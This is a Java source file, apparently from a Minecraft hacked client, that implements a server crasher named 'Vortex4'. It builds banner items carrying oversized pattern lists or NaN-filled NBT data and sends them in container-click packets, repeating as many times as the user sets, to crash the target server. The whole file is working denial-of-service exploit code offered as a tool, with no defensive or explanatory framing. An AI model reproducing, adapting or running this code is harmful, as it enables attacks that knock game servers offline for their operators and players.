package us.whitedev.crashers.impl;

import de.florianmichael.vialoadingbase.ViaLoadingBase;
import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.network.protocol.game.ServerboundContainerClickPacket;
import net.minecraft.world.inventory.ClickType;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.Items;
import us.whitedev.crashers.Crasher;
import us.whitedev.gui.clickgui.ClickGui;
import us.whitedev.helpers.PacketHelper;
import us.whitedev.protocol.XynisProtocol;
import us.whitedev.protocol.components.data.DataComponents;
import us.whitedev.protocol.components.data.impl.DataBannerPatterns;
import us.whitedev.protocol.components.objects.ItemType;
import us.whitedev.protocol.packets.PacketCodec;
import us.whitedev.protocol.packets.play.PacketContainerClick;
import us.whitedev.utils.OptionType;
import us.whitedev.utils.OptionUtil;

import java.util.*;

public class Vortex4 implements Crasher {
    private static final String METHOD_NAME = "Vortex4";
    private boolean enabled = false;

    @Override
    public void onMethod(String[] args) {
        int packets = Integer.parseInt(args[2]);
        int size = Integer.parseInt(args[3]);
        String type = args[4].toLowerCase(Locale.ROOT);
        setEnabled(true);

        msgHelper.sendMessage("Starting crashing with &f" + (ClickGui.isVisible ? getName() : "******"), true);

        int protocol = ViaLoadingBase.getInstance().getTargetVersion().getVersion();
        if (XynisProtocol.SUPPORTED_PROTOCOLS.contains(protocol) && type.equals("normal")) {
            us.whitedev.protocol.components.objects.ItemStack itemStack = getDataLegitBanner(size, protocol);
            PacketCodec.sendPacket(new PacketContainerClick(protocol, 0, 1, 10,
                    PacketContainerClick.ContainerActionType.CLICK_ITEM, PacketContainerClick.ContainerAction.RIGHT_CLICK,
                    itemStack, new Int2ObjectArrayMap<>()), packets);
        }else{
            ItemStack itemStack = getBannerStack(size, type);
            for (int i = 0; i < packets; i++)
                PacketHelper.send(new ServerboundContainerClickPacket(0, 0, 20, 0, ClickType.PICKUP_ALL, itemStack, new Int2ObjectOpenHashMap<>()));
        }

        setEnabled(false);
        msgHelper.sendMessage("Attack &asuccessful &7finished!", true);
    }

    private ItemStack getBannerStack(int size, String propType) {
        CompoundTag rootTag = new CompoundTag();
        if(propType.equals("normal")) {
            CompoundTag blockEntityTag = getLegitBanner(size);
            rootTag.put("BlockEntityTag", blockEntityTag);
        }else{
            for (int i = 0; i < size; ++i)
                rootTag.putDouble(String.valueOf(i), Double.NaN);
        }
        return new ItemStack(Items.BLUE_BANNER, 1, Optional.of(rootTag));
    }

    private CompoundTag getLegitBanner(int size) {
        CompoundTag blockEntityTag = new CompoundTag();
        ListTag patterns = new ListTag();
        Random random = new Random();
        for (int i = 0; i < size; i++) {
            CompoundTag pattern = new CompoundTag();
            pattern.putString("Pattern", "sku");
            pattern.putInt("Color", random.nextInt(1, 13));
            patterns.add(pattern);
        }
        blockEntityTag.put("Patterns", patterns);
        blockEntityTag.putString("id", "banner");
        return blockEntityTag;
    }

    private us.whitedev.protocol.components.objects.ItemStack getDataLegitBanner(int size, int protocol){
        List<DataBannerPatterns.BannerPattern> patternList = new ArrayList<>();

        for (int i = 0; i < size; i++)
            patternList.add(new
                    DataBannerPatterns.BannerPattern(
                            new DataBannerPatterns.Pattern("triangle_top", ""),
                    1));

        DataBannerPatterns dataBannerPatterns = new DataBannerPatterns(patternList);

        DataComponents dataComponents = new DataComponents();
        dataComponents.put(dataBannerPatterns);

        return new us.whitedev.protocol.components.objects.ItemStack(ItemType.WHITE_BANNER.getId(protocol), 1, dataComponents);
    }

    @Override
    public String getName() {
        return METHOD_NAME;
    }

    @Override
    public boolean getEnabled() {
        return enabled;
    }

    @Override
    public void setEnabled(boolean bool) {
        this.enabled = bool;
    }

    @Override
    public List<OptionUtil> getOptions() {
        return List.of(
                new OptionUtil("Packets", OptionType.INTEGER),
                new OptionUtil("Size", OptionType.INTEGER),
                new OptionUtil("Type", OptionType.LIST, new String[]{"Normal", "Overload"})
        );
    }

    @Override
    public String getArgsUsage() {
        return "packets[100], size[1000], type[Normal]";
    }


    @Override
    public String getDescription() {
        return "Big Size Netty Crash";
    }
}